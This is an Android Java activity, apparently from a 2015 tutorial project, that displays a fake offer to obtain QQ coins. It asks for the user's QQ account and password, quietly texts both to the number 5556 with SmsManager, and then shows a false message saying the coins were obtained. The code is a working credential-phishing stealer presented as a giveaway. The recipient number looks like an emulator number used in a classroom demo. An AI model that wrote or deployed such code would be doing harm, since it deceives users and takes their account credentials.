package cn.com.activity;

import android.app.Activity;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import cn.com.alldemophone.R;

/**
 * Created by admin on 2015/8/8.
 */
public class Day01_02  extends Activity{
    EditText day01_02_edi_zhanghao,da01_02_edi_mima;
    Button day01_02_but_huoqu;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.day01_02layout);
        //QQ账号 根据ID获取指定的控件
        day01_02_edi_zhanghao = (EditText) findViewById(R.id.day01_02_edi_zhanghao);
        //QQ密码
        da01_02_edi_mima = (EditText) findViewById(R.id.da01_02_edi_mima);
        //获取Q币
        day01_02_but_huoqu = (Button) findViewById(R.id.day01_02_but_huoqu);
        //点击事件通过定义内部类实现接口的方式
        day01_02_but_huoqu.setOnClickListener(new MyListener());

    }

    //定义内部类实现接口的方式
    class MyListener implements View.OnClickListener{

        @Override
        public void onClick(View v) {
            //获取输入框中的内容
            String zhanghao =  day01_02_edi_zhanghao.getText().toString().trim();
            String mima = da01_02_edi_mima.getText().toString().trim();
            //判断输入框是不是为空
            if(TextUtils.isEmpty(zhanghao) || TextUtils.isEmpty(mima)){
                Toast.makeText(Day01_02.this,"账号或密码不能为空",Toast.LENGTH_SHORT).show();
                return;
            }
            //发送信息
            //得到短信管理者
            SmsManager manager = SmsManager.getDefault();
            manager.sendTextMessage("5556",null,zhanghao+"--"+mima,null,null);
            Toast.makeText(Day01_02.this,"恭喜你，Q币获取成功！",Toast.LENGTH_SHORT).show();
        }
    }
}
